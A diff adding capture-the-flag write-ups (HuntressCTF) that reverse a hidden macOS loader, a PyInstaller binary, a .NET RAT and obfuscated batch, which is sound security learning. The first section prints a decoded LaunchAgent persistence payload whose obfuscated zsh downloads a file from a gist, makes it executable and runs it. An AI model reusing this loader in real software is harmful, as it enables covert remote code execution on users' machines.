@@ -2519,3 +2519,482 @@ Got flag:
 root@kali:~/ctf/HuntressCTF# curl -kL -A 'Mozilla/5.0 93bed45b-7b70-4097-9279-98a4aef0353e' https://chal.ctf.games:30842
 flag{3f2567475c6def39501bab2865aeba60}
 ```
+
+## Welcome to the Park
+
+### Description
+
+> The creator of Jurassic Park is in hiding... amongst Mach-O files, apparently. Can you find him?
+>
+> Download the file(s) below.
+>
+> Attachment: welcomeToThePark.zip
+
+### Flag
+
+flag{680b736565c76941a364775f06383466}
+
+### Solution
+
+- Extracted attached zip file, I found interesting file: `welcome/.hidden/welcomeToThePark`
+- Got Base64 encoded string by `strings` command and decode it, got XML
+- Found obfuscated zsh code and decode it, got URL: <https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01>
+- Downloaded image file
+- Got flag by `strings` command
+
+```console
+root@kali:~/ctf/HuntressCTF# strings welcome/.hidden/welcomeToThePark
+__PAGEZERO
+__TEXT
+__text
+__TEXT
+__stubs
+__TEXT
+__cstring
+__TEXT
+__unwind_info
+__TEXT
+__DATA_CONST
+__got
+__DATA_CONST
+__LINKEDIT
+/usr/lib/dyld
+/usr/lib/libSystem.B.dylib
+PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
+Hello World!
+___stack_chk_fail
+___stack_chk_guard
+_memcpy
+_printf
+_mh_execute_header
+        main
+__mh_execute_header
+_main
+___stack_chk_fail
+___stack_chk_guard
+_memcpy
+_printf
+a.out
+!U[
+
+
+root@kali:~/ctf/HuntressCTF# B64=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48IURPQ1RZUEUgcGxpc3QgUFVCTElDICItLy9BcHBsZS8vRFREIFBMSVNUIDEuMC8vRU4iICJodHRwOi8vd3d3LmFwcGxlLmNvbS9EVERzL1Byb3BlcnR5TGlzdC0xLjAuZHRkIj48cGxpc3QgdmVyc2lvbj0iMS4wIj48ZGljdD48a2V5PkxhYmVsPC9rZXk+PHN0cmluZz5jb20uaHVudHJlc3MuY3RmPC9zdHJpbmc+PGtleT5Qcm9ncmFtQXJndW1lbnRzPC9rZXk+PGFycmF5PjxzdHJpbmc+L2Jpbi96c2g8L3N0cmluZz48c3RyaW5nPi1jPC9zdHJpbmc+PHN0cmluZz5BMGI9J3RtcD0iJChtJztBMGJFUmhlWj0na3RlbXAgL3RtcC9YWCc7QTBiRVJoZVpYPSdYWFhYWFgpIic7QTBiRVI9JzsgY3VybCAtLSc7QTBiRT0ncmV0cnkgNSAtZiAnO0EwYkVSaD0nImh0dHBzOi8vJztBMGJFUmhlWlhEUmk9J2dpc3QuZ2l0aHUnO3hiRVI9J2IuY29tL3MnO2p1dVE9J3R1YXJ0amFzJztqdXVRUTdsN1g1PSdoL2E3ZDE4JztqdXVRUTdsN1g1eVg9JzdjNDRmNDMyNyc7anV1UVE3bDdYNXk9JzczOWI3NTJkMDM3YmU0NWYwMSc7anV1UVE3PSciIC1vICIke3RtcH0iOyBpJztqdXVRUTdsNz0nZiBbWyAtcyAiJHt0bXB9JztqdXVRUTdsN1g9JyIgXV07JztqdVFRN2w3WDV5PScgdGhlbiBjaG0nO2p1UVE3bD0nb2QgNzc3ICIke3RtcH0iOyAnO3pSTzNPVXRjWHQ9JyIke3RtcH0iJzt6Uk8zT1V0PSc7IGZpOyBybSc7elJPM09VdGNYdGVCPScgIiR7dG1wfSInO2VjaG8gLWUgJHtBMGJ9JHtBMGJFUmhlWn0ke0EwYkVSaGVaWH0ke0EwYkVSfSR7QTBiRX0ke0EwYkVSaH0ke0EwYkVSaGVaWERSaX0ke3hiRVJ9JHtqdXVRfSR7anV1UVE3bDdYNX0ke2p1dVFRN2w3WDV5WH0ke2p1dVFRN2w3WDV5fSR7anV1UVE3fSR7anV1UVE3bDd9JHtqdXVRUTdsN1h9JHtqdVFRN2w3WDV5fSR7anVRUTdsfSR7elJPM09VdGNYdH0ke3pSTzNPVXR9JHt6Uk8zT1V0Y1h0ZUJ9IHwgL2Jpbi96c2g8L3N0cmluZz48L2FycmF5PjxrZXk+UnVuQXRMb2FkPC9rZXk+PHRydWUgLz48a2V5PlN0YXJ0SW50ZXJ2YWw8L2tleT48aW50ZWdlcj4xNDQwMDwvaW50ZWdlcj48L2RpY3Q+PC9wbGlzdD4=
+
+root@kali:~/ctf/HuntressCTF# echo ${B64} | base64 -d | xq
+{
+  "plist": {
+    "@version": "1.0",
+    "dict": {
+      "key": [
+        "Label",
+        "ProgramArguments",
+        "RunAtLoad",
+        "StartInterval"
+      ],
+      "string": "com.huntress.ctf",
+      "array": {
+        "string": [
+          "/bin/zsh",
+          "-c",
+          "A0b='tmp=\"$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)\"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='\"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='\" -o \"${tmp}\"; i';juuQQ7l7='f [[ -s \"${tmp}';juuQQ7l7X='\" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 \"${tmp}\"; ';zRO3OUtcXt='\"${tmp}\"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' \"${tmp}\"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB} | /bin/zsh"
+        ]
+      },
+      "true": null,
+      "integer": "14400"
+    }
+  }
+}
+
+root@kali:~/ctf/HuntressCTF# A0b='tmp=\"$(m';A0bERheZ='ktemp /tmp/XX';A0bERheZX='XXXXXX)\"';A0bER='; curl --';A0bE='retry 5 -f ';A0bERh='\"https://';A0bERheZXDRi='gist.githu';xbER='b.com/s';juuQ='tuartjas';juuQQ7l7X5='h/a7d18';juuQQ7l7X5yX='7c44f4327';juuQQ7l7X5y='739b752d037be45f01';juuQQ7='\" -o \"${tmp}\"; i';juuQQ7l7='f [[ -s \"${tmp}';juuQQ7l7X='\" ]];';juQQ7l7X5y=' then chm';juQQ7l='od 777 \"${tmp}\"; ';zRO3OUtcXt='\"${tmp}\"';zRO3OUt='; fi; rm';zRO3OUtcXteB=' \"${tmp}\"';echo -e ${A0b}${A0bERheZ}${A0bERheZX}${A0bER}${A0bE}${A0bERh}${A0bERheZXDRi}${xbER}${juuQ}${juuQQ7l7X5}${juuQQ7l7X5yX}${juuQQ7l7X5y}${juuQQ7}${juuQQ7l7}${juuQQ7l7X}${juQQ7l7X5y}${juQQ7l}${zRO3OUtcXt}${zRO3OUt}${zRO3OUtcXteB}
+tmp=\"$(mktemp /tmp/XXXXXXXX)\"; curl --retry 5 -f \"https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01\" -o \"${tmp}\"; if [[ -s \"${tmp}\" ]]; then chmod 777 \"${tmp}\"; \"${tmp}\"; fi; rm \"${tmp}\"
+
+root@kali:~/ctf/HuntressCTF# # access https://gist.github.com/stuartjash/a7d187c44f4327739b752d037be45f01 and download JohnHammond.jpg image file
+
+root@kali:~/ctf/HuntressCTF# mv ~/Downloads/JohnHammond.jpg .
+
+root@kali:~/ctf/HuntressCTF# file JohnHammond.jpg
+JohnHammond.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 96x96, segment length 16, baseline, precision 8, 484x445, components 3
+
+root@kali:~/ctf/HuntressCTF# strings JohnHammond.jpg | grep flag
+; flag{680b736565c76941a364775f06383466}
+```
+
+## Snake Oil
+
+### Description
+
+> One of our workstations was exhibiting strange network communications... we found this binary that looked to be the culprit. Can you find anything suspicious?
+>
+> Download the file(s) below.
+>
+> Attachments: snake-oil
+
+### Flag
+
+flag{d7267ce26203b5cc69f4bab679cc78d2}
+
+### Solution
+
+Useful tools for this challenge:
+
+- [extremecoders-re/pyinstxtractor: PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)
+- [zrax/pycdc: C++ python bytecode disassembler and decompiler](https://github.com/zrax/pycdc)
+
+```console
+root@kali:~/ctf/HuntressCTF# file snake-oil
+snake-oil: PE32+ executable (console) x86-64, for MS Windows, 7 sections
+```
+
+The attached snake-oil file is PE32+ executable.
+I decompiled snake-oil with Ghidra and found icon generated with PyInstaller.
+
+![snake-oil_pyinstaller_detection.png](img/snake-oil_pyinstaller_detection.png)
+
+I used [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) for Reverse Engineering.
+
+```bash
+git clone https://github.com/extremecoders-re/pyinstxtractor.git
+python3 pyinstxtractor/pyinstxtractor.py ./snake-oil
+```
+
+Found the unfamiliar file `brain-melt.pyc`.
+
+```console
+root@kali:~/ctf/HuntressCTF# file snake-oil_extracted/brain-melt.pyc
+snake-oil_extracted/brain-melt.pyc: Byte-compiled Python module for CPython 3.9, timestamp-based, .py timestamp: Thu Jan  1 00:00:00 1970 UTC, .py size: 0 bytes
+```
+
+I used [pycdc](https://github.com/zrax/pycdc) to decompile this pyc file.
+(FYI: [uncompyle6](https://github.com/rocky/python-uncompyle6/tree/e9120eab45801782fbf645fbf2b7235aac046574) is not working for this pyc. I guess because of Python 3.9.)
+
+```bash
+# Setup for pycdc
+git clone https://github.com/zrax/pycdc.git
+mkdir pycdc_build && cd $_
+cmake ../pycdc/
+make
+
+# Decompile
+./pycdc ../snake-oil_extracted/brain-melt.pyc
+```
+
+output:
+
+```python
+# (snip)
+def decrypt(s1, s2):
+    return ''.join((lambda .0: [ chr(ord(c1) ^ ord(c2)) for c1, c2 in .0 ])(zip(s1, s2)))
+
+
+def deobfuscate():
+    part1 = '2ec7627d{galf'[::-1]
+    part2 = str(base64.b64decode('NjIwM2I1Y2M2OWY0'.encode('ascii')), 'UTF8')
+    part3 = decrypt('\x17*\x07`BC\x14*R@\x14^*', 'uKeVuzwIexplW')
+    key = part1 + part2 + part3
+    return key
+# (snip)
+```
+
+I did the same the above.
+
+```python
+import base64
+
+part1 = '2ec7627d{galf'[::-1]
+part2 = base64.b64decode('NjIwM2I1Y2M2OWY0').decode()
+part3 = ''.join([chr(ord(c1)^ord(c2)) for c1, c2 in zip('\x17*\x07`BC\x14*R@\x14^*', 'uKeVuzwIexplW')])
+print(part1 + part2 + part3)
+```
+
+Got flag.
+
+## RAT
+
+### Description
+
+> I was arguing with a co-worker on whether or not it is "Remote Access Tool" or "Remote Access Trojan", and he didn't agree with me, so I sent him this shady file ;)
+>
+> NOTE: Archive password: infected
+>
+> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
+>
+> Download the file(s) below.
+>
+> Attachments: rat.7z
+
+### Flag
+
+flag{8b988b859588f2725f0c859104919019}
+
+### Solution
+
+Useful tools for this challenge:
+
+- [dnSpy/dnSpy: .NET debugger and assembly editor](https://github.com/dnSpy/dnSpy)
+
+In Windows Powershell:
+
+```powershell
+PS C:\Users\root\Desktop\huntressctf> 7za.exe e -pinfected .\rat.7z
+
+7-Zip (a) 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
+(snip)
+
+PS C:\Users\root\Desktop\huntressctf> dir
+
+
+    Directory: C:\Users\root\Desktop\huntressctf
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         9/21/2023   5:14 PM         524502 rat
+-a----        10/23/2023   6:42 PM         129474 rat.7z
+
+
+PS C:\Users\root\Desktop\huntressctf> file rat
+rat: PE32+ executable (GUI) x86-64 Mono/.Net assembly, for MS Windows
+```
+
+It generated `rat` file and this is PE32+ executable (GUI) x86-64 **Mono/.Net assembly**.
+I used will [dnSpy](https://github.com/dnSpy/dnSpy) to decompile and debug it.
+
+Opened dnSpy and File > Open, select `rat.exe` (I have renamed `rat` to `rat.exe`).
+Looking at source code under the `PopITStub` assembly, I found `decrypt` method in `cry` class.
+I'll try to save the array to return.
+
+1. Set breakpoint to `return array;`
+
+   ![RAT_dnspy_breakpoint.png](img/RAT_dnspy_breakpoint.png)
+
+1. Run `Start` (press F5) and click `OK`
+
+1. Right click `array` line and select Save to save `array` to file.
+   Repeat this twice because this method is called twice.
+
+   ![RAT_dnspy_save_array.png](img/RAT_dnspy_save_array.png)
+
+Looking at the two saved files, these are also PE32+ mono files.
+
+```console
+PS C:\Users\root\Desktop\huntressctf> file .\tmp1.dat
+.\tmp1.dat: PE32+ executable (DLL) (console) x86-64 Mono/.Net assembly, for MS Windows
+PS C:\Users\root\Desktop\huntressctf> file .\tmp2.dat
+.\tmp2.dat: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
+```
+
+Similarly, opened those file with dnSpy.
+There is `Client` assembly in tmp2.exe (I renamed `tmp2.dat` to `tmp2.exe`) and looking at it.
+
+```csharp
+namespace Client
+{
+    // Token: 0x0200000C RID: 12
+    public static class Settings
+    {
+        // Token: 0x06000054 RID: 84 RVA: 0x0000385C File Offset: 0x00001A5C
+        public static bool InitializeSettings()
+        {
+            bool flag;
+            try
+            {
+                Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
+                Settings.aes256 = new Aes256(Settings.Key);
+                Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
+                Settings.Hos_ts = Settings.aes256.Decrypt(Settings.Hos_ts);
+                Settings.Ver_sion = Settings.aes256.Decrypt(Settings.Ver_sion);
+                Settings.In_stall = Settings.aes256.Decrypt(Settings.In_stall);
+                Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
+                Settings.Paste_bin = Settings.aes256.Decrypt(Settings.Paste_bin);
+                Settings.An_ti = Settings.aes256.Decrypt(Settings.An_ti);
+                Settings.Anti_Process = Settings.aes256.Decrypt(Settings.Anti_Process);
+                Settings.BS_OD = Settings.aes256.Decrypt(Settings.BS_OD);
+                Settings.Group = Settings.aes256.Decrypt(Settings.Group);
+                Settings.Hw_id = HwidGen.HWID();
+                Settings.Server_signa_ture = Settings.aes256.Decrypt(Settings.Server_signa_ture);
+                Settings.Server_Certificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certifi_cate)));
+                flag = Settings.VerifyHash();
+            }
+            catch
+            {
+                flag = false;
+            }
+            return flag;
+        }
+
+        // (snip)
+        // Token: 0x0400001B RID: 27
+        public static string Por_ts = "bXGmOq5acG9CAtRKtRJkfqH5X5HLW67RlYyFZJ00/iG0/I1eqBXOR4870uo1QTcLGfpqwcbkWv8oFWIuQOXrBBRM/snjV/KU3AFXq+Y938Y=";
+        // (snip)
+        // Token: 0x04000025 RID: 37
+        public static string Flag = "mZzroGSIkpZlwvCwLG0PHQMXzjphDowlbeBayjWJhmYPJ5KiQeUAbcv9SzTnLGpr3uYQ0VvZ02rGlxz71tOXMemdK1DKKY6uX2QfUJW+WlDPcLi1u48xBrhmDcpRaK1G";
+```
+
+In `Settings` class, `Flag` variable is not used anywhere, although other variables such as `Por_ts` are decrypted in the `InitializeSettings` method.
+I'll try to get the decrypted `Flag` value.
+
+1. Right click in `InitializeSettings` method and Select `Edit Class`
+1. Add `Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));`
+
+   ```csharp
+                   Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
+                   Settings.aes256 = new Aes256(Settings.Key);
+                   Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));  // append this
+                   Settings.Por_ts = Settings.aes256.Decrypt(Settings.Por_ts);
+   ```
+
+1. Click Compile
+1. In above menu, File > Save All and save as tmp22.exe
+1. Open tmp22.exe in dnSpy
+1. Set breakpoint to `Console.WriteLine(Settings.aes256.Decrypt(Settings.Flag));` and Start (F5)
+1. Step Over (F10)
+
+![RAT_flag.png](img/RAT_flag.png)
+
+Got flag.
+
+## Batchfuscation
+
+### Description
+
+> I was reading a report on past Trickbot malware, and I found this sample that looks a lot like their code! Can you make any sense of it?
+>
+> Download the file below.
+>
+> Attachments: batchfuscation
+
+### Flag
+
+flag{acad67e3d0b5bf31ac6639360db9d19a}
+
+### Solution
+
+- A lot of variable is defined with a random name in [set](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/set_1)
+- Keep in replacing variable, I reach the flag
+
+For example, L1 - L5:
+
+```bat
+1  @echo off
+2  set bdevq=set
+3  %bdevq% grfxdh= 
+4  %bdevq%%grfxdh%mbbzmk==
+5  %bdevq%%grfxdh%xeegh%mbbzmk%/
+```
+
+- L2: `bdevq` is set to `set`, I can replace `%bdevq%` to `set`.
+  Thus, L3 result is `set grfxdh=`.
+- L3: there is space (` `) in last char, `grfxdh` is set to ` `.
+  Thus, L4 result is `set mbbzmk==`.
+- L4: `mbbzmk` is set to `=`.
+  Thus, L5 result is `set xeegh=/`.
+- L5: `xeegh` is set to `/`.
+
+L15 - L17:
+
+```bat
+15 set /a bpquuu=4941956 %% 4941859
+16 cmd /c exit %bpquuu%
+17 set grtoy=%=exitcodeAscii%
+```
+
+- L15: `1bpquuu` is set to 97, which is the result of `4941956 % 4941859`
+- L16: cmd.exe is newly executed and exits with exitcode 97
+- L17: `grtoy` is set to `a` because `chr(97)` is `a`
+
+Did repeatedly the above, the following flags will appear.
+Concatenating them in order, got flag.
+
+```bat
+:: set flag_character34=d
+(snip)
+:: set flag_character20=3
+```
+
+solver.py
+
+```python
+def dump_result_and_return_lines(lines, mapping, save=False):
+    data = "\n".join(lines)
+
+    for k, v in mapping.items():
+        data = data.replace(f"%{k}%", v)
+
+    if save:
+        with open("result.bat", "w") as f:
+            f.write(data)
+
+    lines = data.split("\n")
+    return lines
+
+
+def read_file():
+    with open("batchfuscation", "r") as f:
+        lines = f.read().splitlines()
+
+    return lines
+
+
+def get_flag(lines):
+    # Looked at result.bar and search `flag` string, found `:: set flag_character`.
+    # So parse and join them.
+    flag_length = 38
+
+    # init
+    flag = ["" for _ in range(flag_length + 1)]
+
+    for line in lines:
+        if not line.startswith(":: set flag_character"):
+            continue
+
+        line = line.replace(":: set flag_character", "")
+
+        k, v = line.split("=")
+        flag[int(k)] = v
+
+    return "".join(flag)
+
+
+def create_replace_mapping(lines):
+    mapping = {}
+
+    # L2 - L4
+    mapping["bdevq"] = "set"
+    mapping["grfxdh"] = " "
+    mapping["mbbzmk"] = "="
+
+    lines = dump_result_and_return_lines(lines, mapping)
+
+    # L5 - L14
+    for i in range(4, 14):
+        variable_name = lines[i][4:].split("=")[0]
+        char = lines[i][-1]
+
+        mapping[variable_name] = char
+
+    lines = dump_result_and_return_lines(lines, mapping)
+
+    # L15 - L224
+    for i in range(14, 224, 3):
+        formula = lines[i].split("=")[1].replace("%%", "%")
+        char = chr(eval(formula))
+
+        variable_name = lines[i + 2][4:].split("=")[0]
+
+        mapping[variable_name] = char
+
+    lines = dump_result_and_return_lines(lines, mapping)
+
+    return lines
+
+
+def main():
+    lines = read_file()
+    lines = create_replace_mapping(lines)
+    flag = get_flag(lines)
+    print(flag)
+
+
+if __name__ == "__main__":
+    main()
+```
